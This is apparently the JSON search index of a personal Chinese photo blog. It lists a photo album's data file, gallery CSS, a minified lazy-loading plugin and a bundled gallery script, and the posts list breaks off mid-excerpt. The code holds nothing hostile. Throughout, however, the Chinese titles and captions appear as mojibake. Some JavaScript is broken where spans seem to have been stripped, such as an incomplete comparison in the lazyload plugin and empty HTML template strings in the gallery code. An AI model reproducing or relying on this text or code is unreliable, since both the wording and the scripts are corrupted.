{"meta":{"title":"Simleä¸¶æ¨±æœ¨","subtitle":"èƒ†å°æ€•ç”Ÿï¼ä¸æ˜“ç›¸å¤„","description":"å¥½å¥½å­¦ä¹ å¤©å¤©å‘ä¸Š","author":"æ¨±æœ¨","url":"http://yubenliu.cn"},"pages":[{"title":"","date":"2019-08-12T18:21:27.629Z","updated":"2018-05-30T07:50:31.000Z","comments":true,"path":"404.html","permalink":"http://yubenliu.cn/404.html","excerpt":"","text":"404"},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2019-11-08T09:46:34.452Z","comments":true,"path":"about/index.html","permalink":"http://yubenliu.cn/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2019-11-08T09:45:19.599Z","comments":true,"path":"categories/index.html","permalink":"http://yubenliu.cn/categories/index.html","excerpt":"","text":""},{"title":"","date":"2019-08-12T18:21:27.629Z","updated":"2018-06-25T07:02:48.000Z","comments":true,"path":"photos/data.json","permalink":"http://yubenliu.cn/photos/data.json","excerpt":"","text":"{\"list\":[{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"å®¶ä¹¡çš„å†¬å¤©\"],\"type\":[\"image\"],\"month\":2,\"link\":[\"2018-2-19_å®¶ä¹¡çš„å†¬å¤©.JPG\"],\"year\":2018}},{\"date\":\"2016-5-\",\"arr\":{\"text\":[\"ç¯®çƒ love\"],\"type\":[\"image\"],\"month\":5,\"link\":[\"2016-5-12_ç¯®çƒ love.jpg\"],\"year\":2016}},{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"å²æœˆæ©é¥°ä¸ä½å½“åˆçš„ç¹å\"],\"type\":[\"image\"],\"month\":2,\"link\":[\"2018-2-19_å²æœˆæ©é¥°ä¸ä½å½“åˆçš„ç¹å.JPG\"],\"year\":2018}},{\"date\":\"2018-3-\",\"arr\":{\"text\":[\"æ¨±èŠ±å¾ˆç¾\"],\"type\":[\"image\"],\"month\":3,\"link\":[\"2018-3-16_æ¨±èŠ±å¾ˆç¾.JPG\"],\"year\":2018}},{\"date\":\"2018-4-\",\"arr\":{\"text\":[\"éšæ‰‹è¡—æ‹\"],\"type\":[\"image\"],\"month\":4,\"link\":[\"2018-4-12_éšæ‰‹è¡—æ‹.JPG\"],\"year\":2018}},{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"å¯çˆ±çš„å°ä¾„å­\"],\"type\":[\"image\"],\"month\":2,\"link\":[\"2018-2-22_å¯çˆ±çš„å°ä¾„å­.JPG\"],\"year\":2018}},{\"date\":\"2018-5-\",\"arr\":{\"text\":[\"çˆ±æ˜¯ä¸€ç§å…³æ€€\"],\"type\":[\"image\"],\"month\":5,\"link\":[\"2018-5-25_çˆ±æ˜¯ä¸€ç§å…³æ€€.jpg\"],\"year\":2018}},{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"å„¿æ—¶çš„è®°å¿†\"],\"type\":[\"image\"],\"month\":2,\"link\":[\"2018-2-19_å„¿æ—¶çš„è®°å¿†.JPG\"],\"year\":2018}},{\"date\":\"2017-5-\",\"arr\":{\"text\":[\"æ¨ªåº—ä½ å¥½\"],\"type\":[\"image\"],\"month\":5,\"link\":[\"2017-5-29_æ¨ªåº—ä½ å¥½.jpg\"],\"year\":2017}},{\"date\":\"2018-3-\",\"arr\":{\"text\":[\"å¦‚æ­¤å¯çˆ±çš„å¥³å­©å­\"],\"type\":[\"image\"],\"month\":3,\"link\":[\"2018-3-11_å¦‚æ­¤å¯çˆ±çš„å¥³å­©å­.JPG\"],\"year\":2018}},{\"date\":\"2017-5-\",\"arr\":{\"text\":[\"ä¸‰å‚»å¤§é—¹æ¨ªåº—\"],\"type\":[\"image\"],\"month\":5,\"link\":[\"2017-5-28_ä¸‰å‚»å¤§é—¹æ¨ªåº—.jpg\"],\"year\":2017}},{\"date\":\"2018-3-\",\"arr\":{\"text\":[\"å¯¹ç‰›å¼¹ç´\"],\"type\":[\"image\"],\"month\":3,\"link\":[\"2018-3-10_å¯¹ç‰›å¼¹ç´.JPG\"],\"year\":2018}},{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"è°¢è°¢ä½ çš„ğŸ»\"],\"type\":[\"image\"],\"month\":2,\"link\":[\"2018-2-26_è°¢è°¢ä½ çš„ğŸ».JPG\"],\"year\":2018}},{\"date\":\"2018-5-\",\"arr\":{\"text\":[\"ä½•æ¥çš„å½’å±æ„Ÿ\"],\"type\":[\"image\"],\"month\":5,\"link\":[\"2018-5-14_ä½•æ¥çš„å½’å±æ„Ÿ.jpg\"],\"year\":2018}},{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"ç¯ç«é˜‘çŠå¤„\",\"é™¤å¤•ä¹‹å¤œ,å¦ˆå¦ˆçš„é¥­èœ\",\"èƒ½å¦å€Ÿæˆ‘ç©ç©\"],\"type\":[\"image\",\"image\",\"image\"],\"month\":2,\"link\":[\"2018-2-15_ç¯ç«é˜‘çŠå¤„.JPG\",\"2018-2-15_é™¤å¤•ä¹‹å¤œ,å¦ˆå¦ˆçš„é¥­èœ.JPG\",\"2018-2-17_èƒ½å¦å€Ÿæˆ‘ç©ç©.JPG\"],\"year\":2018}},{\"date\":\"2016-8-\",\"arr\":{\"text\":[\"å–ä¸€ä¸‹èŒ\"],\"type\":[\"image\"],\"month\":8,\"link\":[\"2016-8-29_å–ä¸€ä¸‹èŒ.jpg\"],\"year\":2016}},{\"date\":\"2018-3-\",\"arr\":{\"text\":[\"å¥½æƒ³æ—¶é—´å°±æ­¤åœç•™\"],\"type\":[\"image\"],\"month\":3,\"link\":[\"2018-3-11_å¥½æƒ³æ—¶é—´å°±æ­¤åœç•™.JPG\"],\"year\":2018}},{\"date\":\"2018-5-\",\"arr\":{\"text\":[\"ä¸‰å‚»\",\"å†çœ‹æˆ‘å°±æ‰“ä½ \"],\"type\":[\"image\",\"image\"],\"month\":5,\"link\":[\"2018-5-12_ä¸‰å‚».JPG\",\"2018-5-16_å†çœ‹æˆ‘å°±æ‰“ä½ .jpg\"],\"year\":2018}},{\"date\":\"2018-2-\",\"arr\":{\"text\":[\"é¹…å“‡ï¼ï¼ï¼\"],\"type\":[\"image\"],\"month\":2,\"link\":[\"2018-2-20_é¹…å“‡ï¼ï¼ï¼.JPG\"],\"year\":2018}},{\"date\":\"2018-3-\",\"arr\":{\"text\":[\"æ¸…æ™¨ä¸­çš„å¤ªå­æ¹¾\"],\"type\":[\"image\"],\"month\":3,\"link\":[\"2018-3-17_æ¸…æ™¨ä¸­çš„å¤ªå­æ¹¾.JPG\"],\"year\":2018}}]}"},{"title":"","date":"2019-08-12T18:21:27.629Z","updated":"2018-05-30T15:06:36.000Z","comments":true,"path":"photos/ins.css","permalink":"http://yubenliu.cn/photos/ins.css","excerpt":"","text":"#post-instagram{ padding: 30px; } #post-instagram .article-entry{ padding-right: 0; } .instagram{ position: relative; min-height: 500px; } .instagram img { width: 100%; } .instagram .year { font-size: 16px; } .instagram .open-ins{ padding: 10px 0; color: #cdcdcd; } .instagram .open-ins:hover{ color: #657b83; } .instagram .year{ display: inline; } .instagram .thumb { width: 25%; height: 0; padding-bottom: 25%; position: relative; display: inline-block; text-align: center; background: #ededed; outline: 1px solid #ddd; } .instagram .thumb a { position: relative; } .instagram .album h1 em{ font-style: normal; font-size: 14px; margin-left: 10px; } .instagram .album ul{ display: flex; flex-wrap: wrap; clear: both; width: 100%; text-align: left; } .instagram .album li{ list-style: none; display: inline-block; box-sizing: border-box; padding: 0 5px; margin-bottom: -10px; height: 0; width: 25%; position: relative; padding-bottom: 25%; } .instagram .album li:before{ display: none; } .instagram .album div.img-box{ position: absolute; width: 90%; height: 90%; -webkit-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1); -moz-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1); box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1); } .instagram .album div.img-box img{ width: 100%; height: 100%; position: absolute; z-index: 2; } .instagram .album div.img-box .img-bg{ position: absolute; top: 0; left: 0; bottom: 0px; width: 100%; margin: -5px; padding: 5px; -webkit-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1); -moz-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1); box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1); -webkit-transition: all 0.15s ease-out 0.1s; -moz-transition: all 0.15s ease-out 0.1s; -o-transition: all 0.15s ease-out 0.1s; transition: all 0.15s ease-out 0.1s; opacity: 0.2; cursor: pointer; display: block; z-index: 3; } .instagram .album div.img-box .icon { font-size: 14px; position: absolute; left: 50%; top: 50%; margin-left: -7px; margin-top: -7px; color: #999; z-index: 1; } .instagram .album div.img-box .img-bg:hover{ opacity: 0; } .photos-btn-wrap { border-bottom: 1px solid #e5e5e5; margin-bottom: 20px; } .photos-btn { font-size: 16px; color: #333; margin-bottom: -4px; padding: 5px 8px 3px; } .photos-btn.active { color: #08c; border: 1px solid #e5e5e5; border-bottom: 5px solid #fff; } @media screen and (max-width:600px) { .instagram .thumb { width: 50%; padding-bottom: 50%; } .instagram .album li { width: 100%; position: relative; padding-bottom: 100%; text-align: center; } .instagram .album div.img-box{ margin: 0; width: 90%; height: 90%; } }"},{"title":"ç›¸å†Œ","slug":"photos","date":"2019-08-12T18:21:27.629Z","updated":"2018-05-30T15:06:36.000Z","comments":false,"path":"photos/index.html","permalink":"http://yubenliu.cn/photos/index.html","excerpt":"","text":"Photos å¾…ç»­ å›¾ç‰‡æ­£åœ¨åŠ è½½ä¸­â€¦ (function() { var loadScript = function(path) { var $script = document.createElement('script') document.getElementsByTagName('body')[0].appendChild($script) $script.setAttribute('src', path) } setTimeout(function() { loadScript('./ins.js') }, 0) })()"},{"title":"","date":"2019-08-12T18:21:27.629Z","updated":"2018-05-30T15:06:36.000Z","comments":true,"path":"photos/lazyload.min.js","permalink":"http://yubenliu.cn/photos/lazyload.min.js","excerpt":"","text":"/*! * An jQuery | zepto plugin for lazy loading images. * author -> jieyou * see https://github.com/jieyou/lazyload * use some tuupola's code https://github.com/tuupola/jquery_lazyload (BSD) * use component's throttle https://github.com/component/throttle (MIT) */ !function(a){\"function\"==typeof define&&define.amd?define([\"jquery\"],a):a(window.jQuery||window.Zepto)}(function(a){function g(){}function h(a,b){var e;return e=b._$container==d?(\"innerHeight\"in c?c.innerHeight:d.height())+d.scrollTop():b._$container.offset().top+b._$container.height(),e=a.offset().top+b.threshold+a.height()}function k(b,e){var f;return f=e._$container==d?a.fn.scrollLeft?d.scrollLeft():c.pageXOffset:e._$container.offset().left,f>=b.offset().left+e.threshold+b.width()}function l(a,b){var c=0;a.each(function(d){function g(){f.trigger(\"_lazyload_appear\"),c=0}var f=a.eq(d);if(!(f.width()b.failure_limit)return!1}else g()})}function m(a){return a.filter(function(b){return!a.eq(b)._lazyload_loadStarted})}function n(a,b){function h(){f=0,g=+new Date,e=a.apply(c,d),c=null,d=null}var c,d,e,f,g=0;return function(){c=this,d=arguments;var a=new Date-g;return f||(a>=b?h():f=setTimeout(h,b-a)),e}}var f,c=window,d=a(c),e={threshold:0,failure_limit:0,event:\"scroll\",effect:\"show\",effect_params:null,container:c,data_attribute:\"original\",data_srcset_attribute:\"original-srcset\",skip_invisible:!0,appear:g,load:g,vertical_only:!1,check_appear_throttle_time:300,url_rewriter_fn:g,no_fake_img_loader:!1,placeholder_data_img:\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC\",placeholder_real_img:\"http://ditu.baidu.cn/yyfm/lazyload/0.0.1/img/placeholder.png\"};f=function(){var a=Object.prototype.toString;return function(b){return a.call(b).replace(\"[object \",\"\").replace(\"]\",\"\")}}(),a.fn.hasOwnProperty(\"lazyload\")||(a.fn.lazyload=function(b){var i,j,k,h=this;return a.isPlainObject(b)||(b={}),a.each(e,function(g,h){var i=f(b[g]);-1!=a.inArray(g,[\"threshold\",\"failure_limit\",\"check_appear_throttle_time\"])?\"String\"==i?b[g]=parseInt(b[g],10):\"Number\"!=i&&(b[g]=h):\"container\"==g?(b._$container=b.hasOwnProperty(g)?b[g]==c||b[g]==document?d:a(b[g]):d,delete b.container):!e.hasOwnProperty(g)||b.hasOwnProperty(g)&&i==f(e[g])||(b[g]=h)}),i=\"scroll\"==b.event,k=0==b.check_appear_throttle_time?l:n(l,b.check_appear_throttle_time),j=i||\"scrollstart\"==b.event||\"scrollstop\"==b.event,h.each(function(c){var e=this,f=h.eq(c),i=f.attr(\"src\"),k=f.attr(\"data-\"+b.data_attribute),l=b.url_rewriter_fn==g?k:b.url_rewriter_fn.call(e,f,k),n=f.attr(\"data-\"+b.data_srcset_attribute),o=f.is(\"img\");return 1==f._lazyload_loadStarted||i==l?(f._lazyload_loadStarted=!0,h=m(h),void 0):(f._lazyload_loadStarted=!1,o&&!i&&f.one(\"error\",function(){f.attr(\"src\",b.placeholder_real_img)}).attr(\"src\",b.placeholder_data_img),f.one(\"_lazyload_appear\",function(){function i(){d&&f.hide(),o?(n&&f.attr(\"srcset\",n),l&&f.attr(\"src\",l)):f.css(\"background-image\",'url(\"'+l+'\")'),d&&f[b.effect].apply(f,c?b.effect_params:[]),h=m(h)}var d,c=a.isArray(b.effect_params);f._lazyload_loadStarted||(d=\"show\"!=b.effect&&a.fn[b.effect]&&(!b.effect_params||c&&0==b.effect_params.length),b.appear!=g&&b.appear.call(e,f,h.length,b),f._lazyload_loadStarted=!0,b.no_fake_img_loader||n?(b.load!=g&&f.one(\"load\",function(){b.load.call(e,f,h.length,b)}),i()):a(\"\").one(\"load\",function(){i(),b.load!=g&&b.load.call(e,f,h.length,b)}).attr(\"src\",l))}),j||f.on(b.event,function(){f._lazyload_loadStarted||f.trigger(\"_lazyload_appear\")}),void 0)}),j&&b._$container.on(b.event,function(){k(h,b)}),d.on(\"resize load\",function(){k(h,b)}),a(function(){k(h,b)}),this})});"},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2019-11-08T09:47:07.731Z","comments":true,"path":"friends/index.html","permalink":"http://yubenliu.cn/friends/index.html","excerpt":"","text":""},{"title":"","date":"2019-08-12T18:21:27.629Z","updated":"2018-05-31T07:15:58.000Z","comments":true,"path":"photos/ins.js","permalink":"http://yubenliu.cn/photos/ins.js","excerpt":"","text":"/******/ (function(modules) { // webpackBootstrap /******/ // The module cache /******/ var installedModules = {}; /******/ /******/ // The require function /******/ function __webpack_require__(moduleId) { /******/ /******/ // Check if module is in cache /******/ if (installedModules[moduleId]) /******/ return installedModules[moduleId].exports; /******/ /******/ // Create a new module (and put it into the cache) /******/ var module = installedModules[moduleId] = { /******/ exports: {}, /******/ id: moduleId, /******/ loaded: false /******/ }; /******/ /******/ // Execute the module function /******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); /******/ /******/ // Flag the module as loaded /******/ module.loaded = true; /******/ /******/ // Return the exports of the module /******/ return module.exports; /******/ } /******/ /******/ /******/ // expose the modules object (__webpack_modules__) /******/ __webpack_require__.m = modules; /******/ /******/ // expose the module cache /******/ __webpack_require__.c = installedModules; /******/ /******/ // __webpack_public_path__ /******/ __webpack_require__.p = \"/dist/\"; /******/ /******/ // Load entry module and return exports /******/ return __webpack_require__(0); /******/ }) /************************************************************************/ /******/ ([ /* 0 */ /***/ function(module, exports, __webpack_require__) { 'use strict'; __webpack_require__(1); var _view = __webpack_require__(2); var _view2 = _interopRequireDefault(_view); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } /** * @name impush-client * @description è¿™ä¸ªé¡¹ç›®è®©æˆ‘å‘å®¶è‡´å¯Œâ€¦ * @date 2016-12-1 */ var _collection = []; var _count = 0; var searchData; function addMask(elem) { var rect = elem.getBoundingClientRect(); var style = getComputedStyle(elem, null); var mask = document.createElement('i'); mask.className = 'icon-film'; mask.style.color = '#fff'; mask.style.fontSize = '26px'; mask.style.position = 'absolute'; mask.style.right = '10px'; mask.style.bottom = '10px'; mask.style.zIndex = 1; elem.parentNode.appendChild(mask); } var createVideoIncon = function createVideoIncon() { var $videoImg = document.querySelectorAll('.thumb a[data-type=\"video\"]'); for (var i = 0, len = $videoImg.length; i < len; i++) { addMask($videoImg[i]); } }; var render = function render(res) { var ulTmpl = \"\"; for (var j = 0, len2 = res.list.length; j < len2; j++) { var data = res.list[j].arr; var liTmpl = \"\"; for (var i = 0, len = data.link.length; i < len; i++) { var minSrc = 'https://raw.githubusercontent.com/yubenliu99/blog-back-up/master/min_photos/' + data.link[i]; var src = 'https://raw.githubusercontent.com/yubenliu99/blog-back-up/master/photos/' + data.link[i]; var type = data.type[i]; var target = src + (type === 'video' ? '.mp4' : '.jpg'); src += ''; liTmpl += '\\ \\ \\ \\ ' + data.text[i] + '\\ '; } ulTmpl = ulTmpl + '' + data.year + 'å¹´' + data.month + 'æœˆ\\ ' + liTmpl + '\\ '; } document.querySelector('.instagram').innerHTML = '' + ulTmpl + ''; createVideoIncon(); _view2.default.init(); }; var replacer = function replacer(str) { var arr = str.split(\"/\"); return \"/assets/ins/\" + arr[arr.length - 1]; }; var ctrler = function ctrler(data) { var imgObj = {}; for (var i = 0, len = data.length; i < len; i++) { var y = data[i].y; var m = data[i].m; var src = replacer(data[i].src); var text = data[i].text; var key = y + \"\" + ((m + \"\").length == 1 ? \"0\" + m : m); if (imgObj[key]) { imgObj[key].srclist.push(src); imgObj[key].text.push(text); } else { imgObj[key] = { year: y, month: m, srclist: [src], text: [text] }; } } render(imgObj); }; function loadData(success) { if (!searchData) { var xhr = new XMLHttpRequest(); xhr.open('GET', './data.json?t=' + +new Date(), true); xhr.onload = function() { if (this.status >= 200 && this.status < 300) { var res = JSON.parse(this.response); searchData = res; success(searchData); } else { console.error(this.statusText); } }; xhr.onerror = function() { console.error(this.statusText); }; xhr.send(); } else { success(searchData); } } var Ins = { init: function init() { loadData(function(data) { render(data); }); } }; Ins.init(); // export default impush; /***/ }, /* 1 */ /***/ function(module, exports, __webpack_require__) { /* WEBPACK VAR INJECTION */ (function(global) { 'use strict'; var inViewport = __webpack_require__(3); var lazyAttrs = ['data-src']; global.lzld = lazyload(); // Provide libs using getAttribute early to get the good src // and not the fake data-src replaceGetAttribute('Image'); replaceGetAttribute('IFrame'); function registerLazyAttr(attr) { if (indexOf.call(lazyAttrs, attr) === -1) { lazyAttrs.push(attr); } } function lazyload(opts) { opts = merge({ 'offset': 333, 'src': 'data-src', 'container': false }, opts || {}); if (typeof opts.src === 'string') { registerLazyAttr(opts.src); } var elts = []; function show(elt) { var src = findRealSrc(elt); if (src) { elt.src = src; } elt.setAttribute('data-lzled', true); elts[indexOf.call(elts, elt)] = null; } function findRealSrc(elt) { if (typeof opts.src === 'function') { return opts.src(elt); } return elt.getAttribute(opts.src); } function register(elt) { elt.onload = null; elt.removeAttribute('onload'); elt.onerror = null; elt.removeAttribute('onerror'); if (indexOf.call(elts, elt) === -1) { inViewport(elt, opts, show); } } return register; } function replaceGetAttribute(elementName) { var fullname = 'HTML' + elementName + 'Element'; if (fullname in global === false) { return; } var original = global[fullname].prototype.getAttribute; global[fullname].prototype.getAttribute = function(name) { if (name === 'src') { var realSrc; for (var i = 0, max = lazyAttrs.length; i < max; i++) { realSrc = original.call(this, lazyAttrs[i]); if (realSrc) { break; } } return realSrc || original.call(this, name); } // our own lazyloader will go through theses lines // because we use getAttribute(opts.src) return original.call(this, name); }; } function merge(defaults, opts) { for (var name in defaults) { if (opts[name] === undefined) { opts[name] = defaults[name]; } } return opts; } // http://webreflection.blogspot.fr/2011/06/partial-polyfills.html function indexOf(value) { for (var i = this.length; i-- && this[i] !== value;) {} return i; } module.exports = lazyload; // export default impush; /* WEBPACK VAR INJECTION */ }.call(exports, (function() { return this; }()))) /***/ }, /* 2 */ /***/ function(module, exports) { 'use strict'; var initPhotoSwipeFromDOM = function initPhotoSwipeFromDOM(gallerySelector) { // parse slide data (url, title, size ...) from DOM elements // (children of gallerySelector) var parseThumbnailElements = function parseThumbnailElements(el) { el = el.parentNode.parentNode; var thumbElements = el.getElementsByClassName('thumb'), numNodes = thumbElements.length, items = [], figureEl, linkEl, size, type, // video or not target, item; for (var i = 0; i < numNodes; i++) { figureEl = thumbElements[i]; // // include only element nodes if (figureEl.nodeType !== 1) { continue; } linkEl = figureEl.children[0]; // size = linkEl.getAttribute('data-size').split('x'); type = linkEl.getAttribute('data-type'); target = linkEl.getAttribute('data-target'); // create slide object item = { src: linkEl.getAttribute('href'), w: parseInt(size[0], 10), h: parseInt(size[1], 10) }; if (figureEl.children.length > 1) { item.title = figureEl.children[1].innerHTML; } if (linkEl.children.length > 0) { item.msrc = linkEl.children[0].getAttribute('src'); item.type = type; item.target = target; item.html = ''; if (type === 'video') { //item.src = null; } } item.el = figureEl; // save link to element for getThumbBoundsFn items.push(item); } return items; }; // find nearest parent element var closest = function closest(el, fn) { return el && (fn(el) ? el : closest(el.parentNode, fn)); }; // triggers when user clicks on thumbnail var onThumbnailsClick = function onThumbnailsClick(e) { e = e || window.event; e.preventDefault ? e.preventDefault() : e.returnValue = false; var eTarget = e.target || e.srcElement; // find root element of slide var clickedListItem = closest(eTarget, function(el) { return el.tagName && el.tagName.toUpperCase() === 'FIGURE'; }); if (!clickedListItem) { return; } // find index of clicked item by looping through all child nodes // alternatively, you may define index via data- attribute var clickedGallery = clickedListItem.parentNode, // childNodes = clickedListItem.parentNode.childNodes, // numChildNodes = childNodes.length, childNodes = document.getElementsByClassName('thumb'), numChildNodes = childNodes.length, nodeIndex = 0, index; for (var i = 0; i < numChildNodes; i++) { if (childNodes[i].nodeType !== 1) { continue; } if (childNodes[i] === clickedListItem) { index = nodeIndex; break; } nodeIndex++; } if (index >= 0) { // open PhotoSwipe if valid index found openPhotoSwipe(index, clickedGallery); } return false; }; // parse picture index and gallery index from URL (#&pid=1&gid=2) var photoswipeParseHash = function photoswipeParseHash() { var hash = window.location.hash.substring(1), params = {}; if (hash.length < 5) { return params; } var vars = hash.split('&'); for (var i = 0; i < vars.length; i++) { if (!vars[i]) { continue; } var pair = vars[i].split('='); if (pair.length < 2) { continue; } params[pair[0]] = pair[1]; } if (params.gid) { params.gid = parseInt(params.gid, 10); } return params; }; var openPhotoSwipe = function openPhotoSwipe(index, galleryElement, disableAnimation, fromURL) { var pswpElement = document.querySelectorAll('.pswp')[0], gallery, options, items; items = parseThumbnailElements(galleryElement); // define options (if needed) options = { // define gallery index (for URL) galleryUID: galleryElement.getAttribute('data-pswp-uid'), getThumbBoundsFn: function getThumbBoundsFn(index) { // See Options -> getThumbBoundsFn section of documentation for more info var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail pageYScroll = window.pageYOffset || document.documentElement.scrollTop, rect = thumbnail.getBoundingClientRect(); return { x: rect.left, y: rect.top + pageYScroll, w: rect.width }; } }; // PhotoSwipe opened from URL if (fromURL) { if (options.galleryPIDs) { // parse real index when custom PIDs are used // http://photoswipe.com/documentation/faq.html#custom-pid-in-url for (var j = 0; j < items.length; j++) { if (items[j].pid == index) { options.index = j; break; } } } else { // in URL indexes start from 1 options.index = parseInt(index, 10) - 1; } } else { options.index = parseInt(index, 10); } // exit if index not found if (isNaN(options.index)) { return; } if (disableAnimation) { options.showAnimationDuration = 0; } // Pass data to PhotoSwipe and initialize it gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options); gallery.init(); var $tempVideo; var stopVideoHandle = function stopVideoHandle() { if ($tempVideo) { $tempVideo.remove(); $tempVideo = null; } }; var changeHandle = function changeHandle() { var item = gallery.currItem; stopVideoHandle(); if (item.type === 'video') { var $ctn = item.container; var style = $ctn.getElementsByClassName('pswp__img')[0].style; var $video = document.createElement('video'); $video.setAttribute('autoplay', 'autoplay'); $video.setAttribute('controls', 'controls'); $video.setAttribute('src', item.target); $video.style.width = style.width; $video.style.height = style.height; $video.style.position = 'absolute'; $video.style.zIndex = 2; $tempVideo = $video; $ctn.appendChild($video); } }; gallery.listen('initialZoomIn', changeHandle); gallery.listen('afterChange', changeHandle); gallery.listen('initialZoomOut', stopVideoHandle); }; // loop through all gallery elements and bind events var galleryElements = document.querySelectorAll(gallerySelector); for (var i = 0, l = galleryElements.length; i < l; i++) { galleryElements[i].setAttribute('data-pswp-uid', i + 1); galleryElements[i].onclick = onThumbnailsClick; } // Parse URL and open gallery if it contains #&pid=3&gid=1 var hashData = photoswipeParseHash(); if (hashData.pid && hashData.gid) { openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true); } }; var Viewer = function() { function init() { initPhotoSwipeFromDOM('.photos'); } return { init: init }; }(); module.exports = Viewer; /***/ }, /* 3 */ /***/ function(module, exports) { /* WEBPACK VAR INJECTION */ (function(global) { module.exports = inViewport; var instances = []; var supportsMutationObserver = typeof global.MutationObserver === 'function'; function inViewport(elt, params, cb) { var opts = { container: global.document.body, offset: 0 }; if (params === undefined || typeof params === 'function') { cb = params; params = {}; } var container = opts.container = params.container || opts.container; var offset = opts.offset = params.offset || opts.offset; for (var i = 0; i < instances.length; i++) { if (instances[i].container === container) { return instances[i].isInViewport(elt, offset, cb); } } return instances[ instances.push(createInViewport(container)) - 1 ].isInViewport(elt, offset, cb); } function addEvent(el, type, fn) { if (el.attachEvent) { el.attachEvent('on' + type, fn); } else { el.addEventListener(type, fn, false); } } function debounce(func, wait, immediate) { var timeout; return function() { var context = this, args = arguments; var callNow = immediate && !timeout; clearTimeout(timeout); timeout = setTimeout(later, wait); if (callNow) func.apply(context, args); function later() { timeout = null; if (!immediate) func.apply(context, args); } }; } // https://github.com/jquery/sizzle/blob/3136f48b90e3edc84cbaaa6f6f7734ef03775a07/sizzle.js#L708 var contains = function() { if (!global.document) { return true; } return global.document.documentElement.compareDocumentPosition ? function(a, b) { return !!(a.compareDocumentPosition(b) & 16); } : global.document.documentElement.contains ? function(a, b) { return a !== b && (a.contains ? a.contains(b) : false); } : function(a, b) { while (b = b.parentNode) { if (b === a) { return true; } } return false; }; } function createInViewport(container) { var watches = createWatches(); var scrollContainer = container === global.document.body ? global : container; var debouncedCheck = debounce(watches.checkAll(watchInViewport), 15); addEvent(scrollContainer, 'scroll', debouncedCheck); if (scrollContainer === global) { addEvent(global, 'resize', debouncedCheck); } if (supportsMutationObserver) { observeDOM(watches, container, debouncedCheck); } // failsafe check, every 200ms we check for visible images // usecase: a hidden parent containing eleements // when the parent becomes visible, we have no event that the children // became visible setInterval(debouncedCheck, 150); function isInViewport(elt, offset, cb) { if (!cb) { return isVisible(elt, offset); } var remote = createRemote(elt, offset, cb); remote.watch(); return remote; } function createRemote(elt, offset, cb) { function watch() { watches.add(elt, offset, cb); } function dispose() { watches.remove(elt); } return { watch: watch, dispose: dispose }; } function watchInViewport(elt, offset, cb) { if (isVisible(elt, offset)) { watches.remove(elt); cb(elt); } } function isVisible(elt, offset) { if (!contains(global.document.documentElement, elt) || !contains(global.document.documentElement, container)) { return false; } // Check if the element is visible // https://github.com/jquery/jquery/blob/740e190223d19a114d5373758127285d14d6b71e/src/css/hiddenVisibleSelectors.js if (!elt.offsetWidth || !elt.offsetHeight) { return false; } var eltRect = elt.getBoundingClientRect(); var viewport = {}; if (container === global.document.body) { viewport = { top: -offset, left: -offset, right: global.document.documentElement.clientWidth + offset, bottom: global.document.documentElement.clientHeight + offset }; } else { var containerRect = container.getBoundingClientRect(); viewport = { top: containerRect.top - offset, left: containerRect.left - offset, right: containerRect.right + offset, bottom: containerRect.bottom + offset }; } // The element must overlap with the visible part of the viewport var visible = ( (eltRect.right > viewport.left) && (eltRect.left < viewport.right) && (eltRect.bottom > viewport.top) && (eltRect.top < viewport.bottom) ); return visible; } return { container: container, isInViewport: isInViewport }; } function createWatches() { var watches = []; function add(elt, offset, cb) { if (!isWatched(elt)) { watches.push([elt, offset, cb]); } } function remove(elt) { var pos = indexOf(elt); if (pos !== -1) { watches.splice(pos, 1); } } function indexOf(elt) { for (var i = watches.length - 1; i >= 0; i--) { if (watches[i][0] === elt) { return i; } } return -1; } function isWatched(elt) { return indexOf(elt) !== -1; } function checkAll(cb) { return function() { for (var i = watches.length - 1; i >= 0; i--) { cb.apply(this, watches[i]); } }; } return { add: add, remove: remove, isWatched: isWatched, checkAll: checkAll }; } function observeDOM(watches, container, cb) { var observer = new MutationObserver(watch); var filter = Array.prototype.filter; var concat = Array.prototype.concat; observer.observe(container, { childList: true, subtree: true, // changes like style/width/height/display will be catched attributes: true }); function watch(mutations) { // some new DOM nodes where previously watched // we should check their positions if (mutations.some(knownNodes) === true) { setTimeout(cb, 0); } } function knownNodes(mutation) { var nodes = concat.call([], Array.prototype.slice.call(mutation.addedNodes), mutation.target ); return filter.call(nodes, watches.isWatched).length > 0; } } /* WEBPACK VAR INJECTION */ }.call(exports, (function() { return this; }()))) /***/ } /******/ ]);"},{"title":"tags","date":"2018-09-30T10:23:38.000Z","updated":"2019-11-08T09:45:36.013Z","comments":true,"path":"tags/index.html","permalink":"http://yubenliu.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"å°å¿ƒæƒ…","slug":"xiaoqiu","date":"2019-08-23T06:20:00.000Z","updated":"2019-11-08T10:37:39.070Z","comments":true,"path":"2019/08/23/xiaoqiu/","link":"","permalink":"http://yubenliu.cn/2019/08/23/xiaoqiu/","excerpt":"ä¸ä½ 